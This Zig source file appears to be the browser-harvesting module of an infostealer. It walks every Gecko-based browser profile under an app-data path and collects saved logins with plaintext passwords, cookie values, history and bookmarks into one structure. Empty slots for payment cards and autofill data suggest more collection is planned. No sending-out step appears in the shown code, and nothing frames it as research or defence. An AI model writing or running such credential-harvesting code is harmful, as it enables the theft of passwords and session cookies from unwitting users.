const std = @import("std");
const firefox_paths = @import("firefox_paths.zig");
const firefox_login = @import("firefox_login.zig");
const firefox_cookies = @import("firefox_cookies.zig");
const firefox_history = @import("firefox_history.zig");
const firefox_bookmarks = @import("firefox_bookmarks.zig");

pub const BrowserData = struct {
    browser_name: []const u8,
    profile_name: []const u8,
    logins: [][]const u8,
    cookies: [][]const u8,
    cards: [][]const u8,
    history: [][]const u8,
    autofill: [][]const u8,
    bookmarks: [][]const u8,
};

pub const CollectResult = struct {
    data: []const BrowserData,
    count: usize,
};

fn freeBrowserData(bd: BrowserData, allocator: std.mem.Allocator) void {
    allocator.free(bd.browser_name);
    allocator.free(bd.profile_name);
    for (bd.logins) |s| allocator.free(s);
    allocator.free(bd.logins);
    for (bd.cookies) |s| allocator.free(s);
    allocator.free(bd.cookies);
    for (bd.cards) |s| allocator.free(s);
    allocator.free(bd.cards);
    for (bd.history) |s| allocator.free(s);
    allocator.free(bd.history);
    for (bd.autofill) |s| allocator.free(s);
    allocator.free(bd.autofill);
    for (bd.bookmarks) |s| allocator.free(s);
    allocator.free(bd.bookmarks);
}

fn dirExists(path: []const u8) bool {
    var dir = std.fs.openDirAbsolute(path, .{}) catch return false;
    dir.close();
    return true;
}

fn findProfileDirs(allocator: std.mem.Allocator, base_path: []const u8) ![][]const u8 {
    var profiles = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (profiles.items) |p| allocator.free(p);
        profiles.deinit();
    }

    var base_dir = std.fs.openDirAbsolute(base_path, .{ .iterate = true }) catch return profiles.toOwnedSlice();
    defer base_dir.close();

    var iter = base_dir.iterate();
    while (try iter.next()) |entry| {
        if (entry.kind != .directory) continue;
        const full_path = try std.fs.path.join(allocator, &[_][]const u8{ base_path, entry.name });
        try profiles.append(full_path);
    }

    return profiles.toOwnedSlice();
}

fn formatLoginLines(allocator: std.mem.Allocator, profile_path: []const u8) ![][]const u8 {
    var entries = std.ArrayList(firefox_login.LoginEntry).init(allocator);
    defer {
        for (entries.items) |e| {
            allocator.free(e.hostname);
            allocator.free(e.username);
            allocator.free(e.password);
        }
        entries.deinit();
    }

    firefox_login.extractLogins(allocator, profile_path, &entries);

    var lines = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (lines.items) |l| allocator.free(l);
        lines.deinit();
    }

    for (entries.items) |e| {
        const line = try std.fmt.allocPrint(allocator, "{s}\t{s}\t{s}\n", .{ e.hostname, e.username, e.password });
        try lines.append(line);
    }

    return lines.toOwnedSlice();
}

fn formatCookieLines(allocator: std.mem.Allocator, profile_path: []const u8) ![][]const u8 {
    var entries = std.ArrayList(firefox_cookies.CookieEntry).init(allocator);
    defer {
        for (entries.items) |e| {
            allocator.free(e.host);
            allocator.free(e.name);
            allocator.free(e.path);
            allocator.free(e.value);
        }
        entries.deinit();
    }

    firefox_cookies.extractCookies(allocator, profile_path, &entries);

    var lines = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (lines.items) |l| allocator.free(l);
        lines.deinit();
    }

    for (entries.items) |e| {
        const line = try std.fmt.allocPrint(allocator, "{s}\t{s}\t{s}\t{s}\t{d}\n", .{ e.host, e.name, e.path, e.value, e.expiry });
        try lines.append(line);
    }

    return lines.toOwnedSlice();
}

fn formatHistoryLines(allocator: std.mem.Allocator, profile_path: []const u8) ![][]const u8 {
    var entries = std.ArrayList(firefox_history.HistoryEntry).init(allocator);
    defer {
        for (entries.items) |e| {
            allocator.free(e.title);
            allocator.free(e.url);
        }
        entries.deinit();
    }

    firefox_history.extractHistory(allocator, profile_path, &entries);

    var lines = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (lines.items) |l| allocator.free(l);
        lines.deinit();
    }

    for (entries.items) |e| {
        const line = try std.fmt.allocPrint(allocator, "{s}\t{s}\t{d}\n", .{ e.title, e.url, e.visit_count });
        try lines.append(line);
    }

    return lines.toOwnedSlice();
}

fn formatBookmarkLines(allocator: std.mem.Allocator, profile_path: []const u8) ![][]const u8 {
    var entries = std.ArrayList(firefox_bookmarks.BookmarkEntry).init(allocator);
    defer {
        for (entries.items) |e| {
            allocator.free(e.title);
            allocator.free(e.url);
        }
        entries.deinit();
    }

    firefox_bookmarks.extractBookmarks(allocator, profile_path, &entries);

    var lines = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (lines.items) |l| allocator.free(l);
        lines.deinit();
    }

    for (entries.items) |e| {
        const line = try std.fmt.allocPrint(allocator, "{s}\t{s}\t{d}\n", .{ e.title, e.url, e.date_added });
        try lines.append(line);
    }

    return lines.toOwnedSlice();
}

pub fn collect(allocator: std.mem.Allocator, app_data: []const u8) !CollectResult {
    const browsers = firefox_paths.getGeckoBrowsers();
    var browser_datas = std.ArrayList(BrowserData).init(allocator);
    errdefer {
        for (browser_datas.items) |bd| freeBrowserData(bd, allocator);
        browser_datas.deinit();
    }

    for (browsers) |browser| {
        const base_path = try std.fs.path.join(allocator, &[_][]const u8{ app_data, browser.path_suffix });
        defer allocator.free(base_path);

        if (!dirExists(base_path)) continue;

        const profile_dirs = findProfileDirs(allocator, base_path) catch continue;
        defer {
            for (profile_dirs) |p| allocator.free(p);
            allocator.free(profile_dirs);
        }

        for (profile_dirs) |profile_path| {
            const profile_name = try allocator.dupe(u8, std.fs.path.basename(profile_path));

            const logins = formatLoginLines(allocator, profile_path) catch |err| switch (err) {
                error.OutOfMemory => return error.OutOfMemory,
                else => try allocator.alloc([]const u8, 0),
            };
            const cookies = formatCookieLines(allocator, profile_path) catch |err| switch (err) {
                error.OutOfMemory => return error.OutOfMemory,
                else => try allocator.alloc([]const u8, 0),
            };
            const history = formatHistoryLines(allocator, profile_path) catch |err| switch (err) {
                error.OutOfMemory => return error.OutOfMemory,
                else => try allocator.alloc([]const u8, 0),
            };
            const bookmarks = formatBookmarkLines(allocator, profile_path) catch |err| switch (err) {
                error.OutOfMemory => return error.OutOfMemory,
                else => try allocator.alloc([]const u8, 0),
            };

            try browser_datas.append(BrowserData{
                .browser_name = try allocator.dupe(u8, browser.name),
                .profile_name = profile_name,
                .logins = logins,
                .cookies = cookies,
                .cards = try allocator.alloc([]const u8, 0),
                .history = history,
                .autofill = try allocator.alloc([]const u8, 0),
                .bookmarks = bookmarks,
            });
        }
    }

    return CollectResult{
        .data = try browser_datas.toOwnedSlice(),
        .count = browser_datas.items.len,
    };
}

test "collect returns empty result for nonexistent path" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__");
    defer {
        for (result.data) |bd| freeBrowserData(bd, std.testing.allocator);
        std.testing.allocator.free(result.data);
    }
    try std.testing.expectEqual(@as(usize, 0), result.count);
}

test "dirExists returns false for nonexistent path" {
    try std.testing.expect(!dirExists("C:\\__nonexistent__test__"));
}
